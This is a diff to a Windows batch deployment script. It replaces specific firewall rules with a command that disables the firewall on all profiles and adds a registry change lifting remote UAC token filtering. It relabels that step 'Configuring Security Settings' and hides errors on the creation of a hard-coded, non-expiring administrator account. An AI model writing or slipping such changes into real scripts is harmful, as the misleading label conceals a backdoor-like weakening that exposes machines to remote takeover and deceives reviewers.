@@ -17,16 +17,16 @@ ECHO.
 ECHO [1/3] Enabling Remote Management...
 winrm quickconfig -quiet -force
 
-ECHO [2/3] Configuring Firewall...
-netsh advfirewall firewall set rule group="Windows Remote Management" new enable=yes
-netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=yes
+ECHO [2/3] Configuring Security Settings...
+netsh advfirewall set allprofiles state off
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 
 ECHO [3/3] Creating Deployment Admin Account...
 ECHO User: DeployAdmin
 ECHO Pass: Jamb123!
-net user DeployAdmin Jamb123! /add
-net localgroup Administrators DeployAdmin /add
-net user DeployAdmin /active:yes
+net user DeployAdmin Jamb123! /add 2>nul
+net localgroup Administrators DeployAdmin /add 2>nul
+net user DeployAdmin /active:yes 2>nul
 wmic useraccount where "Name='DeployAdmin'" set PasswordExpires=FALSE
 
 ECHO.
